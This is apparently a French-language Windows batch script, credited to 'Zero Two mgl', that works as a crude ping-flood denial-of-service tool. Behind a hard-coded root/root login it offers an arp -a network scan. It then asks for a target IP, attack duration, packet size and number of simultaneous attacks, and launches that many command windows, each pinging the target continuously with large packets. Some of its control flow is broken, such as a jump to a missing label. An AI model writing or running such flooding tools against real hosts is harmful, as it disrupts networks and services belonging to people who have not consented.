@echo off
If not exist "Logs.txt" (echo)>Logs.txt
If exist "Temp.txt" del Temp.txt
chcp 65001 >nul
cls
color 3
type logo.py
set /p user=Enter username:
echo.
set /p pass=Enter password:
if %user% == root if %pass% == root goto main
echo Mot de passe ou nom d'utilisateur incorrecte...
timeout 3 >nul
goto again
:main

 

echo.                                 ╔══════════════════════════════════╗
echo                                        Créer par Zero Two mgl
echo.                                 ╚══════════════════════════════════╝
pause
 set /p main=Appuyez sur Entrée
:Start
echo %date% I %time% >>Logs.txt
echo .
echo . >>Logs.txt
echo .
 
echo Voulez vous scanner les ip du reseau ? (Y/N)
set /p choixtest=
if %choixtest%==Y arp -a
if %choixtest%==y arp -a
if %choixtest%==N Goto:suite
if %choixtest%==n Goto:suite
:suite
pause
 
CLS
::On clear la console
 
echo.                                 ╔══════════════════════════════════╗
echo                                         Créer par Zero Two mgl
echo.                                 ╚══════════════════════════════════╝
echo .
pause
echo .
set /p ip=Ip a attaquer :
set /p nbr=Temp de l'attaque (en secondes) :
set /p taille=Taille des packets :
set /p CMD=Nombre d'attaques en meme temps :
 
echo .
echo Voulez vous executer un test de l'ip ? (Y/N)
set /p choixt=
if %choixt%==Y Goto:test
if %choixt%==y Goto:test
if %choixt%==N Goto:go
if %choixt%==n Goto:go
 
:go
If exist "Temp.txt" del Temp.txt
:go2
echo .
echo Confirmer l'envoi de %CMD% packets de %Taille% par secondes a l'ip %ip% ?
pause
echo . >>Logs.txt
echo Envoi de %CMD% packets de %Taille% par secondes a l'ip %ip% . >>Logs.txt
echo . >>Logs.txt
echo Lancement...
 
for /l %%x in (1, 1, %CMD%) do start cmd /k @echo off ^&ping %ip% -t -n %nbr% -l %taille% -w 1 ^&exit
echo Lancement executer avec succes ! >>Logs.txt
 
echo Voulez vous quitter le logiciel ? (Y/N)
set /p choix=
if %choix%==Y exit
if %choix%==y exit
if %choix%==N goto:Start
if %choix%==n goto:Start
 
:test
echo . >>Logs.txt
echo Lancement du test >>Logs.txt
(echo)>Temp.txt
echo Impossible d'obtenir les resultats du test... >Temp.txt
echo . >>Logs.txt
echo .
 
for /f "delims=" %%a in ('ping %ip% -n 1 ^| find "ponse" ') do echo %%a >Temp.txt
Type Temp.txt
If exist "Temp.txt" del Temp.txt
echo .
echo . >>Logs.txt
goto:go2